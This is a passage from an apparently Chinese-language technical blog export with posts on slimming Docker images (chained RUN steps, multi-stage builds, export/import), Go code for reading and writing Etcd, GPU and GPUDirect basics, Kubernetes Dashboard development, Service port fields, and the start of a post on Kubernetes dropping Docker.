<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FROM ubuntu</span><br><span class="line"></span><br><span class="line">ENV VER     3.0.0  </span><br><span class="line">ENV TARBALL http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-$VER.tar.gz  </span><br><span class="line"># &#x3D;&#x3D;&gt; Install curl and helper tools...</span><br><span class="line">RUN apt-get update  </span><br><span class="line">RUN apt-get install -y  curl make gcc  </span><br><span class="line"># &#x3D;&#x3D;&gt; Download, compile, and install...</span><br><span class="line">RUN curl -L $TARBALL | tar zxv  </span><br><span class="line">WORKDIR  redis-$VER  </span><br><span class="line">RUN make  </span><br><span class="line">RUN make install  </span><br><span class="line">#...</span><br><span class="line"># &#x3D;&#x3D;&gt; Clean up...</span><br><span class="line">WORKDIR &#x2F;  </span><br><span class="line">RUN apt-get remove -y --auto-remove curl make gcc  </span><br><span class="line">RUN apt-get clean  </span><br><span class="line">RUN rm -rf &#x2F;var&#x2F;lib&#x2F;apt&#x2F;lists&#x2F;*  &#x2F;redis-$VER  </span><br><span class="line">#...</span><br><span class="line">CMD [&quot;redis-server&quot;]</span><br></pre></td></tr></table></figure>
<p>构建镜像，名称叫 test/test:0.1。 我们对dockerfile做优化，优化后dockerfile：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FROM ubuntu</span><br><span class="line"></span><br><span class="line">ENV VER     3.0.0  </span><br><span class="line">ENV TARBALL http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-$VER.tar.gz</span><br><span class="line"></span><br><span class="line">RUN echo &quot;&#x3D;&#x3D;&gt; Install curl and helper tools...&quot;  &amp;&amp; \  </span><br><span class="line">    apt-get update                      &amp;&amp; \</span><br><span class="line">    apt-get install -y  curl make gcc   &amp;&amp; \</span><br><span class="line">    echo &quot;&#x3D;&#x3D;&gt; Download, compile, and install...&quot;  &amp;&amp; \</span><br><span class="line">    curl -L $TARBALL | tar zxv  &amp;&amp; \</span><br><span class="line">    cd redis-$VER               &amp;&amp; \</span><br><span class="line">    make                        &amp;&amp; \</span><br><span class="line">    make install                &amp;&amp; \</span><br><span class="line">    echo &quot;&#x3D;&#x3D;&gt; Clean up...&quot;  &amp;&amp; \</span><br><span class="line">    apt-get remove -y --auto-remove curl make gcc  &amp;&amp; \</span><br><span class="line">    apt-get clean                                  &amp;&amp; \</span><br><span class="line">    rm -rf &#x2F;var&#x2F;lib&#x2F;apt&#x2F;lists&#x2F;*  &#x2F;redis-$VER</span><br><span class="line">#...</span><br><span class="line">CMD [&quot;redis-server&quot;]</span><br></pre></td></tr></table></figure>
<p>构建镜像，名称叫 test/test:0.2。 对比两个镜像大小：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@k8s-master:&#x2F;tmp&#x2F;iops# docker images</span><br><span class="line">REPOSITORY       TAG           IMAGE ID            CREATED             SIZE</span><br><span class="line">test&#x2F;test        0.2         58468c0222ed        2 minutes ago       98.1MB</span><br><span class="line">test&#x2F;test        0.1         e496cf7243f2        6 minutes ago       307MB</span><br><span class="line">root@k8s-master:&#x2F;tmp&#x2F;iops#</span><br></pre></td></tr></table></figure>
<p>可以看到，将多条RUN命令串联起来构建的镜像大小是每条命令分别RUN的三分之一。 提示：为了应对镜像中存在太多镜像层，docker 1.13版本以后，提供了一个压扁镜像功能，即将 dockerfile 中所有的操作压缩为一层。这个特性还处于实验阶段，docker默认没有开启，如果要开启，需要在启动docker时添加-experimental 选项，并在docker build 构建镜像时候添加 –squash 。我们不推荐使用这个办法，请在撰写 dockerfile 时遵循最佳实践编写，不要试图用这种办法去压缩镜像。</p>
<h4 id="使用多阶段构建"><a href="#使用多阶段构建" class="headerlink" title="使用多阶段构建"></a>使用多阶段构建</h4><p>dockerfile中每条指令都会为镜像增加一个镜像层，并且你需要在移动到下一个镜像层之前清理不需要的组件。实际上，有一个dockerfile用于开发（其中包含构建应用程序所需的所有内容）以及一个用于生产的瘦客户端，它只包含你的应用程序以及运行它所需的内容。这被称为“建造者模式”。docker 17.05.0-ce版本以后支持多阶段构建。使用多阶段构建，你可以在dockerfile中使用多个FROM语句，每条FROM指令可以使用不同的基础镜像，这样您可以选择性地将服务组件从一个阶段COPY到另一个阶段，在最终镜像中只保留需要的内容。 下面是一个使用COPY –from 和 FROM … AS … 的dockerfile：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Compile</span><br><span class="line">FROM golang:1.9.0 AS builder</span><br><span class="line">WORKDIR &#x2F;go&#x2F;src&#x2F;v9.git...com&#x2F;...&#x2F;k8s-monitor</span><br><span class="line">COPY . .</span><br><span class="line">WORKDIR &#x2F;go&#x2F;src&#x2F;v9.git...com&#x2F;...&#x2F;k8s-monitor</span><br><span class="line">RUN make build</span><br><span class="line">RUN mv k8s-monitor &#x2F;root</span><br><span class="line"></span><br><span class="line"># Package</span><br><span class="line"># Use scratch image</span><br><span class="line">FROM scratch</span><br><span class="line">WORKDIR &#x2F;root&#x2F;</span><br><span class="line">COPY --from&#x3D;builder &#x2F;root .</span><br><span class="line">EXPOSE 8080</span><br><span class="line">CMD [&quot;&#x2F;root&#x2F;k8s-monitor&quot;]</span><br></pre></td></tr></table></figure>
<p>构建镜像，你会发现生成的镜像只有上面COPY 指令指定的内容，镜像大小只有2M。这样在以前使用两个dockerfile（一个dockerfile用于开发和一个用于生产的瘦客户端），现在使用多阶段构建就可以搞定。</p>
<h4 id="业务服务镜像技巧"><a href="#业务服务镜像技巧" class="headerlink" title="业务服务镜像技巧"></a>业务服务镜像技巧</h4><p>docker在build镜像的时候，如果某个命令相关的内容没有变化，会使用上一次缓存（cache）的文件层，在构建业务镜像的时候可以注意下面两点： 不变或者变化很少的体积较大的依赖库和经常修改的自有代码分开； 因为cache缓存在运行docker build命令的本地机器上，建议固定使用某台机器来进行docker build，以便利用cache。 下面是构建Spring Boot应用镜像的例子，用来说明如何分层。其他类型的应用，比如Java WAR包，Nodejs的npm 模块等，可以采取类似的方式。 1、在dockerfile所在目录，解压缩maven生成的jar包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ unzip &lt;path-to-app-jar&gt;.jar -d app</span><br></pre></td></tr></table></figure>
<p>2、dockerfile 我们把应用的内容分成4个部分COPY到镜像里面：其中前面3个基本不变，第4个是经常变化的自有代码。最后一行是解压缩后，启动spring boot应用的方式。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FROM openjdk:8-jre-alpine</span><br><span class="line"></span><br><span class="line">LABEL maintainer &quot;opl-xws@xiaomi.com&quot;</span><br><span class="line">COPY app&#x2F;BOOT-INF&#x2F;lib&#x2F; &#x2F;app&#x2F;BOOT-INF&#x2F;lib&#x2F;</span><br><span class="line">COPY app&#x2F;org &#x2F;app&#x2F;org</span><br><span class="line">COPY app&#x2F;META-INF &#x2F;app&#x2F;META-INF</span><br><span class="line">COPY app&#x2F;BOOT-INF&#x2F;classes &#x2F;app&#x2F;BOOT-INF&#x2F;classes</span><br><span class="line">EXPOSE 8080</span><br><span class="line">CMD [&quot;&#x2F;usr&#x2F;bin&#x2F;java&quot;, &quot;-cp&quot;, &quot;&#x2F;app&quot;, &quot;org.springframework.boot.loader.JarLauncher&quot;]</span><br></pre></td></tr></table></figure>
<p>这样在构建镜像时候可大大提高构建速度。 ###其他优化方法 1. RUN命令中执行apt、apk或者yum类工具技巧 如果在RUN命令中执行apt、apk或者yum类工具，可以借助这些工具提供的一些小技巧来减少镜像层数量及镜像大小。举几个例子： （1）在执行apt-get install -y 时增加选项— no-install-recommends ，可以不用安装建议性（非必须）的依赖，也可以在执行apk add 时添加选项–no-cache 达到同样效果； （2）执行yum install -y 时候， 可以同时安装多个工具，比如yum install -y gcc gcc-c++ make …。将所有yum install 任务放在一条RUN命令上执行，从而减少镜像层的数量； （3）组件的安装和清理要串联在一条指令里面，如 apk –update add php7 &amp;&amp; rm -rf /var/cache/apk/* ，因为dockerfile的每条指令都会产生一个文件层，如果将apk add … 和 rm -rf … 命令分开，清理无法减小apk命令产生的文件层的大小。 Ubuntu或Debian可以使用 rm -rf /<strong>var</strong>/lib/apt/lists/* 清理镜像中缓存文件；CentOS等系统使用yum clean all 命令清理。 2. 压缩镜像 docker 自带的一些命令还能协助压缩镜像，比如 export 和 import</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ docker run -d test&#x2F;test:0.2</span><br><span class="line">$ docker export 747dc0e72d13 | docker import - test&#x2F;test:0.3</span><br></pre></td></tr></table></figure>
<p>使用这种方式需要先将容器运行起来，而且这个过程中会丢失镜像原有的一些信息，比如：导出端口，环境变量，默认指令。 查看这两个镜像history信息，如下，可以看到test/test:0.3 丢失了所有的镜像层信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@k8s-master:&#x2F;tmp&#x2F;iops# docker history test&#x2F;test:0.3</span><br><span class="line">IMAGE               CREATED             CREATED BY          SIZE                COMMENT</span><br><span class="line">6fb3f00b7a72        15 seconds ago                          84.7MB              Imported from -</span><br><span class="line">root@k8s-master:&#x2F;tmp&#x2F;iops# docker history test&#x2F;test:0.2</span><br><span class="line">IMAGE               CREATED             CREATED BY                                      SIZE                COMMENT</span><br><span class="line">58468c0222ed        2 hours ago         &#x2F;bin&#x2F;sh -c #(nop)  CMD [&quot;redis-server&quot;]         0B       </span><br><span class="line">1af7ffe3d163        2 hours ago         &#x2F;bin&#x2F;sh -c echo &quot;&#x3D;&#x3D;&gt; Install curl and helper…   15.7MB   </span><br><span class="line">8bac6e733d54        2 hours ago         &#x2F;bin&#x2F;sh -c #(nop)  ENV TARBALL&#x3D;http:&#x2F;&#x2F;downlo…   0B       </span><br><span class="line">793282f3ef7a        2 hours ago         &#x2F;bin&#x2F;sh -c #(nop)  ENV VER&#x3D;3.0.0                0B       </span><br><span class="line">74f8760a2a8b        8 days ago          &#x2F;bin&#x2F;sh -c #(nop)  CMD [&quot;&#x2F;bin&#x2F;bash&quot;]            0B       </span><br><span class="line">&lt;missing&gt;           8 days ago          &#x2F;bin&#x2F;sh -c mkdir -p &#x2F;run&#x2F;systemd &amp;&amp; echo &#39;do…   7B</span><br><span class="line">&lt;missing&gt;           8 days ago          &#x2F;bin&#x2F;sh -c sed -i &#39;s&#x2F;^#\s*\(deb.*universe\)$…   2.76kB</span><br><span class="line">&lt;missing&gt;           8 days ago          &#x2F;bin&#x2F;sh -c rm -rf &#x2F;var&#x2F;lib&#x2F;apt&#x2F;lists&#x2F;*          0B</span><br><span class="line">&lt;missing&gt;           8 days ago          &#x2F;bin&#x2F;sh -c set -xe   &amp;&amp; echo &#39;#!&#x2F;bin&#x2F;sh&#39; &gt; &#x2F;…   745B    </span><br><span class="line">&lt;missing&gt;           8 days ago          &#x2F;bin&#x2F;sh -c #(nop) ADD file:5fabb77ea8d61e02d…   82.4MB   </span><br><span class="line">root@k8s-master:&#x2F;tmp&#x2F;iops#</span><br></pre></td></tr></table></figure>
<p>社区里还有很多压缩工具，比如docker-squash ，用起来更简单方便，并且不会丢失原有镜像的自带信息，大家有兴趣可以试试。 转自<a href="https://mp.weixin.qq.com/s/blZt_jmHBprX9tzbyQRWIg" target="_blank" rel="noopener">米生态云</a></p>
]]></content>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang 读取写入Etcd数据库</title>
    <url>/2020/09/21/Golang-%E8%AF%BB%E5%8F%96%E5%86%99%E5%85%A5Etcd%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
    <content><![CDATA[<p>           项目中用到Etcd数据库来存储容器的信息和应用的域名信息，将操作Etcd的golang代码整理了一下</p>
<p>1、将Container信息写入到指定目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c, err :&#x3D; common.GetEtcdClient()</span><br><span class="line">	if err !&#x3D; nil &#123;</span><br><span class="line">		beego.Error(&quot;get etcd client failed&quot;)</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line">	kapi :&#x3D; client.NewKeysAPI(c)</span><br><span class="line">	key :&#x3D; getSkyDnsDomain(domainEtcd.Domain)</span><br><span class="line">	value, \_ :&#x3D; json.Marshal(domainEtcd)</span><br><span class="line">	var etcderr error</span><br><span class="line">	common.HaproxyTemplateCache.Lock.Lock()</span><br><span class="line">	defer common.HaproxyTemplateCache.Lock.Unlock()</span><br><span class="line"></span><br><span class="line">	switch domainEtcd.Action &#123;</span><br><span class="line">	case &quot;add&quot;:</span><br><span class="line">		\_, etcderr &#x3D; kapi.Create(context.Background(), key, string(value))</span><br><span class="line">		common.HaproxyTemplateCache.Data\[domainEtcd.Domain\] &#x3D; &amp;models.HaproxyConfigration&#123;</span><br><span class="line">			DomainEtcd: domainEtcd,</span><br><span class="line">		&#125;</span><br><span class="line">	case &quot;delete&quot;:</span><br><span class="line">		\_, etcderr &#x3D; kapi.Delete(context.Background(), key, &amp;client.DeleteOptions&#123;&#125;)</span><br><span class="line">		delete(common.HaproxyTemplateCache.Data, domainEtcd.Domain)</span><br><span class="line">	&#125;</span><br><span class="line">	if etcderr !&#x3D; nil &#123;</span><br><span class="line">		beego.Error(&quot;updatecontainer event erro&quot;, etcderr)</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>2、读取Etcd的缓存数据 example，只获取其中的非目录信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">func loadHaproxyTemplateCache() &#123;</span><br><span class="line">	HaproxyTemplateCache.Lock.Lock()</span><br><span class="line">	defer HaproxyTemplateCache.Lock.Unlock()</span><br><span class="line">	HaproxyTemplateCache.Data &#x3D; make(map\[string\]\*models.HaproxyConfigration)</span><br><span class="line">	client1, \_ :&#x3D; GetEtcdClient()</span><br><span class="line">	api :&#x3D; client.NewKeysAPI(client1)</span><br><span class="line">	&#x2F;\*set skydns domain info\*&#x2F;</span><br><span class="line">	res, err1 :&#x3D; api.Get(context.Background(), &quot;&#x2F;skydns&#x2F;local&quot;, &amp;client.GetOptions&#123;Recursive: true&#125;)</span><br><span class="line">	if err1 !&#x3D; nil &#123;</span><br><span class="line">		beego.Error(&quot;get &#x2F;dockerstack info failed&quot;)</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	skydnsNodesInfo :&#x3D; make(map\[string\]string)</span><br><span class="line">	getAllNode(res.Node, skydnsNodesInfo)</span><br><span class="line">	var domain models.DomainEtcd</span><br><span class="line">	for \_, domainStr :&#x3D; range skydnsNodesInfo &#123;</span><br><span class="line">		json.Unmarshal(\[\]byte(domainStr), &amp;domain)</span><br><span class="line">		HaproxyTemplateCache.Data\[domain.Domain\].DomainEtcd &#x3D; &amp;domain</span><br><span class="line">	&#125;</span><br><span class="line">	&#x2F;\*set dockerstack container info\*&#x2F;</span><br><span class="line">	res, err1 &#x3D; api.Get(context.Background(), &quot;&#x2F;dockerstack&quot;, &amp;client.GetOptions&#123;Recursive: true&#125;)</span><br><span class="line">	if err1 !&#x3D; nil &#123;</span><br><span class="line">		beego.Error(&quot;get &#x2F;dockerstack info failed&quot;)</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line">	dockerstackNodesInfo :&#x3D; make(map\[string\]string)</span><br><span class="line">	getAllNode(res.Node, dockerstackNodesInfo)</span><br><span class="line">	var container models.ContainerEtcd</span><br><span class="line">	for \_, containerStr :&#x3D; range skydnsNodesInfo &#123;</span><br><span class="line">		json.Unmarshal(\[\]byte(containerStr), &amp;container)</span><br><span class="line">		HaproxyTemplateCache.Data\[domain.Domain\].Containers\[container.ContainerId\] &#x3D; &amp;container</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">func getAllNode(rootNode \*client.Node, nodesInfo map\[string\]string) &#123;</span><br><span class="line">	if !rootNode.Dir &#123;</span><br><span class="line">		nodesInfo\[rootNode.Key\] &#x3D; rootNode.Value</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line">	for node :&#x3D; range rootNode.Nodes &#123;</span><br><span class="line">		getAllNode(rootNode.Nodes\[node\], nodesInfo)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>附 etcd存储的数据结构信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;the container info in etcd</span><br><span class="line">type ContainerEtcd struct &#123;</span><br><span class="line">	HostIp        string</span><br><span class="line">	HostPort      int64</span><br><span class="line">	Domain        string</span><br><span class="line">	ContainerId   string</span><br><span class="line">	ContainerIp   string</span><br><span class="line">	ContainerPort int64</span><br><span class="line">	Action        string</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;domain info in etcd</span><br><span class="line">type DomainEtcd struct &#123;</span><br><span class="line">	Port   int64</span><br><span class="line">	Host   string</span><br><span class="line">	Domain string</span><br><span class="line">	Action string</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type HaproxyConfigration struct &#123;</span><br><span class="line">	DomainEtcd \*DomainEtcd</span><br><span class="line">	Containers map\[string\]\*ContainerEtcd</span><br><span class="line">&#125;</span><br><span class="line">type HaproxyTemplateCache struct &#123;</span><br><span class="line">	Data map\[string\]\*HaproxyConfigration</span><br><span class="line">	Lock sync.RWMutex</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>本文只是想提供一些代码参考，业务内容就不细讲了。。</p>
]]></content>
  </entry>
  <entry>
    <title>GPU 相关的基础知识</title>
    <url>/2020/10/10/GPU-%E7%9B%B8%E5%85%B3%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<p>整理了认为了解GPU，比较重要的几个概念<br>###CPU与GPU的区别<br>CPU需要很强的通用性来处理各种不同的数据类型，还需要进行多种逻辑判断，引入大量的分支跳转和中断处理。GPU面对的则是类型高度统一的、相互无依赖的大规模数据和不需要被打断的纯净的计算环境，如<br>下图所示（绿色的是计算单元，橙红色的是存储单元，橙黄色的是控制单元），与CPU擅长逻辑控制、串行的运算、通用类型数据运算不同，GPU擅长的是大规模并发计算，GPU的工作部分计算量大，但没有什么技术含量,<br>而且需要重复很多次。CPU与GPU相比就类似 教授和小学生，教授积分微分都会算，小学生只会算加减乘除。唯一的限制是，运行在GPU的计算任务可以拆分为多个相同的简单小任务，而且是相互独立的。现在的GPU也能做一些<br>稍微复制的工作，相当于升级成初中生高中生的水平，但是还需要CPU配合才可以，终究还是需要靠GPU来管理。</p>
<p> GPU上适合运行计算密集型的程序和易于并行的程序</p>
<p><img src="/2020/10/10/GPU-%E7%9B%B8%E5%85%B3%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/cpugpu.jpg" alt="avatar"></p>
<p>###SP SM Thread Block grid warp<br>SP(streaming processor):最基本的处理单元，最终的指令和任务都是在SP上执行，GPU的并行计算，即多个SP同时做处理，一个SP 对应一个thread<br>warp：SM调度和执行的基础概念，同时也是一个硬件概念，一个SM中的SP会分成几个warp（SM中的SP进行分组）<br>SM（streaming multiprocessor）:多个SP加上一些其他资源组成SM，其他资源包括存储资源、共享内存、寄存器</p>
<p>###GPU Memory</p>
<p>###GPU P2P</p>
<p>###RDMA</p>
<p>###CUDA</p>
<p>###NVLINK</p>
<p>###NCCL</p>
]]></content>
  </entry>
  <entry>
    <title>GPUDirect Technologies</title>
    <url>/2021/03/01/GPUDirect-Technologies/</url>
    <content><![CDATA[<p>基于GPUDirect 技术，可以使网卡驱动，存储驱动直接从GPU 内存中读取和写入数据，不再需要经过主机CPU、主机内存，减少数据拷贝，GPUDirect技术包括</p>
<ul>
<li>GPUDirect Storage</li>
<li>GPUDirect Remote Direct Memory Access (RDMA)</li>
<li>GPUDirect Peer to Peer (P2P)</li>
<li>GPUDirect Video</li>
</ul>
<h2 id="GPUDirect-Storage"><a href="#GPUDirect-Storage" class="headerlink" title="GPUDirect Storage"></a>GPUDirect Storage</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">NVIDIA® GPUDirect® Storage (GDS) is the newest addition to the GPUDirect family. GDS enables a direct data path for direct memory access (DMA) transfers between GPU memory and storage, which avoids a bounce buffer through the CPU. This direct path increases system bandwidth and decreases the latency and utilization load on the CPU.</span><br></pre></td></tr></table></figure>
<p>在本地存储和远端存储搭建一条直接的数据通道，(Nvme,NVME over Fabric, GPU memory),避免基于CPU 内存的拷贝，可以在网卡或者存储 开启 DMA(Direct Memory Access),如下图所示：</p>
<p><img src="/2021/03/01/GPUDirect-Technologies/1.png" alt="avatar"></p>
<p>使用GPUDirect Storage 需要安装单独的软件，查看Nvidia 官网，目前支持Ubuntu 操作系统，目前GPUDirect Storage 还是一个比较新的技术</p>
<p><img src="/2021/03/01/GPUDirect-Technologies/3.png" alt="avatar"></p>
<h2 id="GPUDirect-RDMA"><a href="#GPUDirect-RDMA" class="headerlink" title="GPUDirect RDMA"></a>GPUDirect RDMA</h2><p>更多详细的内容参考<a href="https://docs.nvidia.com/cuda/gpudirect-rdma/index.html" target="_blank" rel="noopener">这里</a></p>
<p>用于节点间的GPU 之间直接通信，避免了依赖CPU和主机内存的复制，可以提高10倍的性能，GPUDirect RDMA 属于CUDA的一部分，需要下载第三方的Network 驱动来支持 GPUDirect RDMA<br><img src="/2021/03/01/GPUDirect-Technologies/4.png" alt="avatar"></p>
<p>GPU Direct leverages PeerDirect RDMA and PeerDirect ASYNC™ capabilities of the Mellanox network adapters. 对于HCA卡，需要安装nvidia-peer-memory服务<br><img src="/2021/03/01/GPUDirect-Technologies/5.png" alt="avatar"></p>
<p>在单个节点上，如果需要启用GPUDirect RDMA功能，需要保证GPU与第三设备属于同一个PCI Express，我们在外部看来就是必须属于一个NUMA 组</p>
<p><img src="/2021/03/01/GPUDirect-Technologies/6.png" alt="avatar"></p>
<h3 id="GPUDirect-RDMA-如何工作？"><a href="#GPUDirect-RDMA-如何工作？" class="headerlink" title="GPUDirect RDMA 如何工作？"></a>GPUDirect RDMA 如何工作？</h3><p>当设置两个Peer（不通节点的两个GPU）间使用 GPU Direct时，在PCI Express设备的角度看，所有的物理地址相同。在此物理地址空间内是称为PCI BAR的线性窗口。 每个设备最多具有六个BAR寄存器，因此它最多可以具有六个活动的32位BAR区域。 64位BAR占用两个BAR寄存器。 PCI Express设备以对等设备的BAR地址发布到系统内存的相同方式来进行读写操作。传统上，使用CPU的MMU作为内存映射的I / O（MMIO）地址，将BAR窗口之类的资源映射到用户或内核地址空间。 但是，由于当前的操作系统没有足够的机制来在驱动程序之间交换MMIO区域，因此NVIDIA内核驱动程序会导出功能以执行必要的地址转换和映射。</p>
<p><font size="9">通常的 DMA 转换（Standard DMA Transfer)</font></p>
<p><img src="/2021/03/01/GPUDirect-Technologies/7.png" alt="avatar"></p>
<p><font size="9"> GPUDirect RDMA Transfers</font></p>
<p><img src="/2021/03/01/GPUDirect-Technologies/8.png" alt="avatar"></p>
<p><font size="9"> 支持的系统 </font><br><img src="/2021/03/01/GPUDirect-Technologies/10.png" alt="avatar"></p>
<p>对服务器配置有一定的要求才能达到最优性能，(终于明白为啥最新的A100服务器都需要有多个IB卡了，如果一台GPU服务器上有8张GPU卡，可能会存在8张Infiniband卡)</p>
<p><img src="/2021/03/01/GPUDirect-Technologies/9.png" alt="avatar"></p>
<p>什么是PCI BAR Size<br><img src="/2021/03/01/GPUDirect-Technologies/11.png" alt="avatar"></p>
]]></content>
  </entry>
  <entry>
    <title>Kubernetes Dashboard开发说明</title>
    <url>/2020/09/21/Kubernetes-Dashboard%E5%BC%80%E5%8F%91%E8%AF%B4%E6%98%8E/</url>
    <content><![CDATA[<p>  部门准备做一个Kuberentes的发行版，研究了一下Dashboard这个项目，以及这个项目应该如何开发，把一些总结写下。</p>
<h1 id="Dashboard-源码说明"><a href="#Dashboard-源码说明" class="headerlink" title="Dashboard 源码说明"></a>Dashboard 源码说明</h1><p>    dashboard 项目分为backend和frontend两部分，可以通过执行gulp serve进行调试运行，执行gulp build 进行编译<br> <img src="/2020/09/21/Kubernetes-Dashboard%E5%BC%80%E5%8F%91%E8%AF%B4%E6%98%8E/1504234553698022.png" alt="avatar"></p>
<p>       dashboard的backend项目封装了k8s API，heapster API 做了一层封装，包括封装分页查询、界面元数据重新组合等（这里的dashboard backend项目类似一个API 网关，可以集成多个项目的API，提供统一的接口给front项目使用，我们自己就在dashboard的基础上，增加了对tiller的调用）</p>
<p>      dashboard的front项目是基于angular js 实现，（个人对于这块也不是很熟悉，照葫芦画瓢了），封装了不少css，component，还是很好的模仿进行开发的，我在此基础增加了基于Chart创建应用</p>
<p> <img src="/2020/09/21/Kubernetes-Dashboard%E5%BC%80%E5%8F%91%E8%AF%B4%E6%98%8E/1504235671108490.png" alt="avatar"><br>###后端代码</p>
<p>   backend项目是一个golang 项目，main函数在dashboard.go 文件，我们开发的时候，主要是在backend/handler/apihandler.go 文件中增加访问路由，以及访问路由的处理函数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apiV1Ws.Route(</span><br><span class="line">   apiV1Ws.GET(&quot;&#x2F;chart&quot;).</span><br><span class="line">      To(apiHandler.handleGetChartList).</span><br><span class="line">      Writes(helm.ChartListWeb&#123;&#125;))</span><br><span class="line">      </span><br><span class="line">&#x2F;&#x2F;get app template list</span><br><span class="line">func (apiHandler \*APIHandler) handleGetChartList(request \*restful.Request, response \*restful.Response) &#123;</span><br><span class="line">   namespace :&#x3D; parseNamespacePathParameter(request)</span><br><span class="line">   dataSelect :&#x3D; parseDataSelectPathParameter(request)</span><br><span class="line">   result, err :&#x3D; chart.GetChartList(namespace,&quot;&quot;, dataSelect)</span><br><span class="line">   if err !&#x3D; nil &#123;</span><br><span class="line">      handleInternalError(response, err)</span><br><span class="line">      return</span><br><span class="line">   &#125;</span><br><span class="line">   response.WriteHeaderAndEntity(http.StatusOK, result)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>    函数的实现思路可以参考dashboard中的查询pod的思路开发，其中做了分页查询，只要熟悉golang，基本没什么难度</p>
<p>###前端代码</p>
<p>此处略。。完全模仿，让以后的js高手写吧。。  </p>
<p>###翻译</p>
<p>dashboard 的翻译比较麻烦，使用的是google的开源项目。我们要增加自己的字段进行翻译的话，不需要手动在i18中的xtb文件中添加字段，只需要执行一下gulp build，在i18n文件夹中会自动添加我们使用到的字段，然后在xtb文件中进行翻译就好了。具体参考官方说明。<a href="https://github.com/kubernetes/dashboard/blob/master/docs/devel/localization.md" target="_blank" rel="noopener">Locaization Guide</a></p>
<p>###DashBoard 扩展架构</p>
<p> 目前我们把dashboard 进行了扩展，包括镜像管理、模板仓库、监控告警、认证授权 ，具体的组件架构如下：<br><img src="/2020/09/21/Kubernetes-Dashboard%E5%BC%80%E5%8F%91%E8%AF%B4%E6%98%8E/1517796478876012.png" alt="avatar"></p>
]]></content>
      <tags>
        <tag>Kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>Kubernetes 中的port、nodePort、targetPort</title>
    <url>/2020/09/21/Kubernetes-%E4%B8%AD%E7%9A%84port%E3%80%81nodePort%E3%80%81targetPort/</url>
    <content><![CDATA[<p>Kubernetes 在定义Service的时候有几个Port需要澄清一下，例如下面的Service定义  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apiVersion: v1  </span><br><span class="line">kind: Service  </span><br><span class="line">metadata:  </span><br><span class="line">  labels:  </span><br><span class="line">    name: app1  </span><br><span class="line">  name: app1  </span><br><span class="line">  namespace: default  </span><br><span class="line">spec:  </span><br><span class="line">  type: NodePort  </span><br><span class="line">  ports:  </span><br><span class="line">  - port: 8080  </span><br><span class="line">    targetPort: 8080  </span><br><span class="line">    nodePort: 30062&lt;&#x2F;strong&gt;  </span><br><span class="line">  selector:  </span><br><span class="line">    name: app1</span><br></pre></td></tr></table></figure>

<p>参考官方的解释  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Port：</span><br><span class="line">The port that the service is exposed on the service’s cluster ip (virsual ip). Port is the service port which is accessed by others with cluster ip.</span><br></pre></td></tr></table></figure>

<p>  Port是在Service IP中使用的，使用Service IP +Port就可以访问到服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TargetPort：</span><br><span class="line">The port on the pod that the service should proxy traffic to.</span><br></pre></td></tr></table></figure>

<p>  TargetPort 说的是Pod内的应用暴露的服务端口，Service IP+Port的访问会被代理到这个Target Port  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">NodePort：</span><br><span class="line">On top of having a cluster-internal IP, expose the service on a port on each node of the cluster (the same port on each node). You&#39;ll be able to contact the service on any</span><br><span class="line"></span><br><span class="line">&lt;nodeIP&gt;:nodePort</span><br><span class="line">address. So nodePort is alse the service port which can be accessed by the node ip by others with external ip.</span><br></pre></td></tr></table></figure>

<p>NodePort是Kubernetes集群提供给外部客户端访问Service 使用的端口，一般是主机IP+NodePort 就可以访问到该服务</p>
]]></content>
      <tags>
        <tag>Kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>Kubernetes 弃用docker</title>
    <url>/2021/01/04/Kubernetes-%E5%BC%83%E7%94%A8Docker/</url>
    <content><![CDATA[<p>Kubernetes 在其最新的 Changelog 中宣布，自 Kubernetes 1.20 之后将弃用 docker 作为容器运行时。那么这到底是怎么回事？开发者和企业会受到什么样到影响？</p>
<p>近几年，Kubernetes 已经成为自有机房、云上广泛使用的容器编排方案，最广泛的使用方式是 Kubernetes+docker。从 DevOps 人员的角度，一面用 kubctl 命令、k8s API 来操作集群，一面在单机用 docker 命令来管理镜像、运行镜像。</p>
